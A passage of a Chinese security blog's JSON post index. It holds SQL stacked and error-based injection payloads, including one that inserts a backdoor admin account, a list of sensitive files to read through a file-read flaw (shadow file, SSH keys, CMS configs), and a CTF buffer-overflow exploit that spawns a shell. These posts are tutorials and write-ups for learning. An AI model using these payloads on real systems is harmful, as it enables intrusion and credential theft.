t71GHs.png","categories":[{"name":"web安全","slug":"web安全","permalink":"https://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webshell","slug":"Webshell","permalink":"https://leemeanvvi.github.io/tags/Webshell/"}]},{"title":"sql注入-堆叠注入","slug":"sql注入-堆叠注入","date":"2020-01-05T07:51:15.000Z","updated":"2020-06-10T15:36:40.063Z","comments":true,"path":"2020/01/05/sql注入-堆叠注入/","link":"","permalink":"https://leemeanvvi.github.io/2020/01/05/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","excerpt":"之前在强网杯中遇到堆叠注入，感觉打开了新世界的大门，然而一直没去研究，最近刚好想起来，虽然实战中还没碰到过，但是学习一下嘛，说不定哪天就用上了。","text":"之前在强网杯中遇到堆叠注入，感觉打开了新世界的大门，然而一直没去研究，最近刚好想起来，虽然实战中还没碰到过，但是学习一下嘛，说不定哪天就用上了。 堆叠注入是什么在写sql语句时，要用分号作为语句结束的标志。一般情况下，一次性只提交一个sql语句，如show databases;，结果如下 但如果在分号后再构造一个sql语句，那么这一次查询就会执行两个sql语句，如show databases;select user();，结果如下 而堆叠注入就是在传输参数的时候允许传入分号，并且允许执行以分号相隔的多条sql语句。最简单的用法就是select 1;show tables; 爆出当前库的表名。常见的注入要受原本的sql语句的限制，select就只能select，update就只能update，进行相应的增删改查。但是由于堆叠注入是在原本的sql语句结束后再构造新的sql语句，不受前面的sql语句的限制，威胁更大，不过局限也大。 堆叠注入的用法 使用预处理语句执行sql语句 set @sql = concat(“select * from xxx”); #存储sql语句prepare sqla from @sql; #预定义sql语句execute sqla; #执行sql语句 例如构造payload为1;set @sql = concat(&quot;select user,passwd from user&quot;);prepare sqla from @sql;execute sqla;#就可以在执行完原本的sql语句后再执行查询用户名和密码的sql语句。 使用预处理语句绕过关键词过滤 可以使用char函数配合绕过，如select被过滤的时候，select的ascii码分别为115,101,108,101,99,116，就可以用char(115,101,108,101,99,116)表示select，上述的payload就改为1;set @sql = concat(char(115,101,108,101,99,116),&quot; user,passwd from user&quot;);prepare sqla from @sql;execute sqla;# 直接修改数据库 比如select 1;insert into users(id,username,password) values(88,&#39;test&#39;,&#39;test&#39;)#往后台用户表中添加自己的账号","categories":[{"name":"web安全","slug":"web安全","permalink":"https://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://leemeanvvi.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"任意文件读取读什么","slug":"任意文件读取读什么","date":"2020-01-05T06:32:28.000Z","updated":"2020-06-10T15:36:40.061Z","comments":true,"path":"2020/01/05/任意文件读取读什么/","link":"","permalink":"https://leemeanvvi.github.io/2020/01/05/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E8%AF%BB%E4%BB%80%E4%B9%88/","excerpt":"任意文件读取和任意文件下载还算是常见的漏洞，并且很多时候都可以在上面找到突破口。在此做一个汇总。","text":"任意文件读取和任意文件下载还算是常见的漏洞，并且很多时候都可以在上面找到突破口。在此做一个汇总。 linux /etc/passwd/etc/shadow/root/.bash_history/root/.ssh/id_rsa #ssh私钥/var/lib/mlocate/mlocate.db #低版本linux，存放各文件路径的文件 各种框架dedecms /webroot/data/common.inc.php #数据库配置文件/webroot/data/config.cache.inc.php #含邮件账号 thinkphp /webroot/config/database.php #数据库配置文件 empirecms /webroot/e/config/config.php #数据库配置文件 后续遇到后再补充。。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://leemeanvvi.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"2019 what have i done","slug":"2019-what-have-i-done","date":"2020-01-05T05:25:49.000Z","updated":"2020-06-10T15:36:40.064Z","comments":true,"path":"2020/01/05/2019-what-have-i-done/","link":"","permalink":"https://leemeanvvi.github.io/2020/01/05/2019-what-have-i-done/","excerpt":"2020年都过了几天了，还是给自己的2019年做个总结吧。","text":"2020年都过了几天了，还是给自己的2019年做个总结吧。 1月-5月这段时间非常痛苦，在不想丢掉实习这份收入的情况下，一边实习一边做毕业设计，然后写毕业论文，准备答辩。白天在上班，下班回来没怎么歇息就要着手弄自己拙劣的毕设，赶在ddl前把代码写好，太仓促了，总是在问自己之前的时间用来干嘛了。也还行吧，选题是《基于朴素贝叶斯定理的linux后门检测》（成品比较垃圾，都不好意思放上github，希望自己可以找机会完善）。借这个机会，了解了linux上的常用后门的原理以及检测方法，也在后续的工作中派上用场了，然后就是稍微接触到一些机器学习方面的知识，不至于一无所知（不过也仅限于此了。。）。然后实习上就是挖挖漏洞，写写报告，做做安服，有空就找些漏洞复现一下。 6月5月末的时候，觉得毕业之后还是得找一间大型一点的公司，在小公司比较局限。然后投了bytedance，一面就挂了，知识积累还是8太行，代码能力也很菜。最后去到了integritytech，6月的情况大家懂的。在这期间被派去驻场防守了，本职毕竟是渗透，对攻击payload比较敏感，给客户发现了问题还说得有模有样，带我去排查他们服务器，之前毕设的内容就派上用场了，然后也发现了问题。总之就是得到了客户的认可，感觉自己是有价值的。这期间就相当于在实战应急方面的东西，后门排查，日志分析，攻击溯源，然后在攻防方面也有了一些体会吧。虽然比较苦，9 9 6已经很要命了，而因为某些原因，那段时间可是8 10 7，但是我觉得还是ok的，毕竟我也不是奔着舒适的工作去的，不然我为什么要做乙方呢。 7月-12月6月底领到毕业证，从此已是社会人。回到公司之后就投入到实战当中了。以前getshell后都不敢乱动，现在拿库，维权，内网一条龙，这是在yxzc中最大的收获，感谢d0uchebag，我大哥，说是我安全生涯的领路人也不为过。12月底，想到更高的平台中发展，就投了chaitin。面试的时候感觉是将这一年的收获复述了一遍，看来这一年还是没有白费的。 期待2020，in Chaitin。","categories":[{"name":"whispers","slug":"whispers","permalink":"https://leemeanvvi.github.io/categories/whispers/"}],"tags":[]},{"title":"notes","slug":"notes","date":"2019-12-20T03:41:27.000Z","updated":"2020-06-10T15:36:40.066Z","comments":true,"path":"2019/12/20/notes/","link":"","permalink":"https://leemeanvvi.github.io/2019/12/20/notes/","excerpt":"","text":"deadbeef的作用调用栈 +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp---&gt;+-----------------+ | parameter | | | | | | | | | | | +-----------------+ 构造payload +-----------------+ | system_addr | +-----------------+ | deadbeef | ebp---&gt;+-----------------+ | /bin/sh_addr | | | | | | | | | | | +-----------------+payload = “A”*n + p32(system) + p32(0xdeadbeef) + p32(str_bin_sh) deadbeeef的作用就是覆盖saved ebp 64位ROP需要栈对齐，详情后续再补充 32为ROP栈中参数利用完之后，就要将参数从栈中pop掉","categories":[{"name":"binary security","slug":"binary-security","permalink":"https://leemeanvvi.github.io/categories/binary-security/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://leemeanvvi.github.io/tags/pwn/"}]},{"title":"使用supervisor守护frp","slug":"使用supervisor守护frp","date":"2019-12-14T14:44:10.000Z","updated":"2020-06-10T15:36:40.065Z","comments":true,"path":"2019/12/14/使用supervisor守护frp/","link":"","permalink":"https://leemeanvvi.github.io/2019/12/14/%E4%BD%BF%E7%94%A8supervisor%E5%AE%88%E6%8A%A4frp/","excerpt":"渗透的时候或者平常需要用到内网映射的时候常常会用到frp，但是frp有时会断。以前为了解决这个问题还特意写了个脚本来检查frp进程，现在想起来实在是too young。最近刚好接触到守护进程，就拿frp来试试水，然后supervisor是一款常用的守护进程工具，就决定是你了。","text":"渗透的时候或者平常需要用到内网映射的时候常常会用到frp，但是frp有时会断。以前为了解决这个问题还特意写了个脚本来检查frp进程，现在想起来实在是too young。最近刚好接触到守护进程，就拿frp来试试水，然后supervisor是一款常用的守护进程工具，就决定是你了。 安装我使用的是ubuntu，用apt安装即可 apt-get install supervisor 配置文件supervisor的配置文件是/etc/supervisor/supervisord.conf 12345678910111213141516171819202122232425262728; supervisor config file[unix_http_server]file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; (the path to the socket file)chmod&#x3D;0700 ; sockef file mode (default 0700)[supervisord]logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; (main log file;default $CWD&#x2F;supervisord.log)pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; (supervisord pidfile;default supervisord.pid)childlogdir&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor ; (&#39;AUTO&#39; child log dir, default $TEMP); the below section must remain in the config file for RPC; (supervisorctl&#x2F;web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface[supervisorctl]serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; use a unix:&#x2F;&#x2F; URL for a unix socket; The [include] section can just contain the &quot;files&quot; setting. This; setting can list multiple files (separated by whitespace or; newlines). It can also contain wildcards. The filenames are; interpreted as relative to this file. Included files *cannot*; include files themselves.[include]files &#x3D; &#x2F;etc&#x2F;supervisor&#x2F;conf.d&#x2F;*.conf 可以看到include了/etc/supervisor/conf.d/目录下面的conf文件。我们要守护的进程配置文件就要添加在该目录。这里我们新建一个frp.conf文件，添加内容如下 12345678[program:frp]directory&#x3D;&#x2F;root&#x2F;software&#x2F;frp&#x2F;command&#x3D;&#x2F;root&#x2F;software&#x2F;frp&#x2F;frps -c &#x2F;root&#x2F;software&#x2F;frp&#x2F;frps.iniautostart&#x3D;trueautorestart&#x3D;truestartretries&#x3D;10redirect_stderr&#x3D;truestdout_logfile&#x3D;&#x2F;tmp&#x2F;rdp.log program参数为待会启动的时候的项目名 directory参数为要运行的脚本或程序所在的项目 command参数为要运行该脚本或程序时执行的命令 其他参数顾名思义就好了，具体意义网上也能找到更详细的解答 启动使用supervisorctl start frp命令（根据program名字）即可用supervisor启动frp进程 在启动的时候遇到了一个坑，在保存了配置文件后，输入上述命令显示 frp: ERROR (no such process) 然后查看status，重启supervisor服务之后都不行，一度怀疑人生，最后在大佬的帮助下才知道还要执行supervisorctl reload才会载入上述所写的配置文件，淦。","categories":[{"name":"misc","slug":"misc","permalink":"https://leemeanvvi.github.io/categories/misc/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://leemeanvvi.github.io/tags/linux/"}]},{"title":"rip_wp","slug":"rip-wp","date":"2019-12-12T15:37:40.000Z","updated":"2020-06-10T15:36:40.063Z","comments":true,"path":"2019/12/12/rip-wp/","link":"","permalink":"https://leemeanvvi.github.io/2019/12/12/rip-wp/","excerpt":"从buuctf中简单的题目开始学习pwn吧","text":"从buuctf中简单的题目开始学习pwn吧 查看文件信息使用checksec查看题目中的pwn1文件 123456Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x400000)RWX: Has RWX segments 64位文件，没有开启栈保护，栈上数据可执行，没有开启ASLR ida查看文件代码发现程序中内置了后门函数fun() 1234int fun()&#123; return system(&quot;&#x2F;bin&#x2F;sh&quot;);&#125; 并且看到main函数中使用gets函数直接读取数据 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; &#x2F;&#x2F; [rsp+1h] [rbp-Fh] puts(&quot;please input&quot;); gets(&amp;s, argv); puts(&amp;s); puts(&quot;ok,bye!!!&quot;); return 0;&#125; 那么思路就是在gets读取数据时，覆盖掉栈帧中的返回地址，控制程序ret到fun函数中执行system(“/bin/sh”)的地方，就可以getshell了 栈帧分析当gets读取数据时，将从栈中rbp-fh的地方也就是下表的buf_address开始写，我们的目标是要将返回地址ret_address覆盖成我们想要的地址，从buf_address到rbp的大小为0xf，rbp到ret_address的大小为0x8，所以从buf_address到ret_address的大小为0xf+0x8=0x17，也就是说要在栈中先写入0x17的字符，接着写入我们想控制程序返回的地址了 +-------------------------+ |buf_address | rbp-fh | |------------|------------| | ... | ... | | ... | ... | |------------|------------| | rbp | rbp | |------------|------------| |ret_address | rbp+8h | +-------------------------+ 编写exp在gdb中看到fun函数的地址0x401186 12gdb-peda$ p fun$1 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0x401186 &lt;fun&gt; fun函数的汇编如下 12345678910gdb-peda$ disassemble funDump of assembler code for function fun: 0x0000000000401186 &lt;+0&gt;: push rbp 0x0000000000401187 &lt;+1&gt;: mov rbp,rsp 0x000000000040118a &lt;+4&gt;: lea rdi,[rip+0xe8a] # 0x40201b 0x0000000000401191 &lt;+11&gt;: call 0x401040 &lt;system@plt&gt; 0x0000000000401196 &lt;+16&gt;: nop 0x0000000000401197 &lt;+17&gt;: pop rbp 0x0000000000401198 &lt;+18&gt;: ret End of assembler dump. 关键代码为0x40118a处，将”/bin/sh”字符串传给rdi，然后在0x401191中调用system函数执行，所以我们ret到0x40118a即可，最后exp如下 123456789from pwn import *context.log_level&#x3D;&#39;debug&#39;conn &#x3D; remote(&quot;node3.buuoj.cn&quot;,27674)shell &#x3D; 0x40118apayload &#x3D; &quot;A&quot;*0x17 + p64(shell)conn.sendline(payload)#conn.recvall()conn.interactive()","categories":[{"name":"binary security","slug":"binary-security","permalink":"https://leemeanvvi.github.io/categories/binary-security/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://leemeanvvi.github.io/tags/pwn/"},{"name":"buuctf","slug":"buuctf","permalink":"https://leemeanvvi.github.io/tags/buuctf/"}]},{"title":"gcc与pwn练习","slug":"gcc与pwn练习","date":"2019-12-11T16:41:22.000Z","updated":"2020-06-10T15:36:40.061Z","comments":true,"path":"2019/12/12/gcc与pwn练习/","link":"","permalink":"https://leemeanvvi.github.io/2019/12/12/gcc%E4%B8%8Epwn%E7%BB%83%E4%B9%A0/","excerpt":"","text":"普通用法gcc test.c -o test.o 开启/关闭栈可执行NX-z execstack / -z noexecstack 关闭/开启/全开启栈保护Canary-fno-stack-protector / -fstack-protector / -fstack-protector-all 关闭/开启地址随机化PIE-no-pie / -pie 关闭/部分开启/完全开启对GOT表写权限-z norelro / -z lazy / -z now","categories":[{"name":"binary security","slug":"binary-security","permalink":"https://leemeanvvi.github.io/categories/binary-security/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://leemeanvvi.github.io/tags/pwn/"}]},{"title":"sql注入-报错注入","slug":"sql注入-报错注入","date":"2019-12-10T09:07:03.000Z","updated":"2020-06-10T15:36:40.062Z","comments":true,"path":"2019/12/10/sql注入-报错注入/","link":"","permalink":"https://leemeanvvi.github.io/2019/12/10/sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","excerpt":"当站点中存在注入并且可以返回错误信息时，可以利用报错函数进行注入，省去确认字段数量的麻烦","text":"当站点中存在注入并且可以返回错误信息时，可以利用报错函数进行注入，省去确认字段数量的麻烦 mysql网上常见有十二种报错方法，然而实战中我最常用的只有updatexml()，函数名好记并且构造比较简单，对于其他报错函数非常陌生，遂逐一测试，以下为常见的报错方法在mysql 5.7.28版本下的测试结果 version upadtexml() select updatexml(1,concat(0x7e,user()),1); updatexml() extractvalue() select extractvalue(1,concat(0x7e,user())); extractvalue() floor() select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a; floor() name_const() select name_const(user(),0); 高版本不可用 join select * from(select * from mysql.user a join mysql.user b)c; 能用但貌似只能爆列名，用处不大 exp() select exp(~(select * from(select user())a)); 高版本不可用 GeometryCollection() geometrycollection((select * from(select * from(select user())a)b)); 高版本不可用 polygon() select polygon((select * from(select * from(select user())a)b)); 高版本不可用 multipoint() select multipoint((select * from(select * from(select user())a)b)); 高版本不可用 multlinestring() select multilinestring((select * from(select * from(select user())a)b)); 高版本不可用 multipolygon() select multipolygon((select * from(select * from(select user())a)b)); 高版本不可用 linestring() select linestring((select * from(select * from(select user())a)b)); 高版本不可用 小结updatexml()和extractvalue()函数是比较实用的，floor()函数的构造实在太难记了，后面几种报错方法看payload应该原理差不多，只是用不同函数来触发而已，而且高版本的mysql都用不了。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://leemeanvvi.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"sql注入base","slug":"sql注入base","date":"2019-12-10T08:39:21.000Z","updated":"2020-06-10T15:36:40.066Z","comments":true,"path":"2019/12/10/sql注入base/","link":"","permalink":"https://leemeanvvi.github.io/2019/12/10/sql%E6%B3%A8%E5%85%A5base/","excerpt":"第一篇正式的博客就从我入门安全的sql注入开始吧","text":"第一篇正式的博客就从我入门安全的sql注入开始吧 平平无奇的注入（mysql）sql注入也是老生常谈了，就从最基础的开始吧 判断是否存在注入以及确认是字符型还是数字型 加单引号，加减法，and 1=1，and 1=2 判断字段数量 order by n union select 1,2,3...n (n为字段数量，若与原查询语句不匹配，则sql语句将会报错) 爆当前数据库名（查询字段数量要与原查询语句匹配） union select database() 爆当前用户名 union select user() 爆当前数据库版本 union select version() 爆当前数据库表名 union select table_name from information_schema.tables where table_schema=database() 爆当前数据库的列名 union select column_name from information_schema.columns where table_schema=database() and tables_name=&#39;xxx&#39; dump数据 union select xxx from yyy 学习资源sqli-libs","categories":[{"name":"web安全","slug":"web安全","permalink":"https://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://leemeanvvi.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"beginning","slug":"beginning","date":"2019-12-09T15:46:01.000Z","updated":"2020-06-10T15:36:40.064Z","comments":true,"path":"2019/12/09/beginning/","link":"","permalink":"https://leemeanvvi.github.io/2019/12/09/beginning/","excerpt":"","text":"其实想写博客很久了，在DO的vps上搭过wordpress，写了几篇没人看的文章之后不了了之。2019年12月10日00:09，毕业已经半年了，开始感受到现实带来的压力。生起了写博客的欲望，想要对自己的一些琐事做下记录。终于配置好hexo了，怀揣着些许忐忑和对未来的希冀，明天开始，好好努力吧！","categories":[{"name":"whispers","slug":"whispers","permalink":"https://leemeanvvi.github.io/categories/whispers/"}],"tags":[]}],"categories":[{"name":"web安全","slug":"web安全","permalink":"https://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"whispers","slug":"whispers","permalink":"https://leemeanvvi.github.io/categories/whispers/"},{"name":"binary security","slug":"binary-security","permalink":"https://leemeanvvi.github.io/categories/binary-security/"},{"name":"misc","slug":"misc","permalink":"https://leemeanvvi.github.io/categories/misc/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"https://leemeanvvi.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Webshell","slug":"Webshell","permalink":"https://leemeanvvi.github.io/tags/Webshell/"},{"name":"sql注入","slug":"sql注入","permalink":"https://leemeanvvi.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://leemeanvvi.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"name":"pwn","slug":"pwn","permalink":"https://leemeanvvi.github.io/tags/pwn/"},{"name":"linux","slug":"linux","permalink":"https://leemeanvvi.github.io/tags/linux/"},{"name":"buuctf","slug":"buuctf","permalink":"https://leemeanvvi.github.io/tags/buuctf/"}]}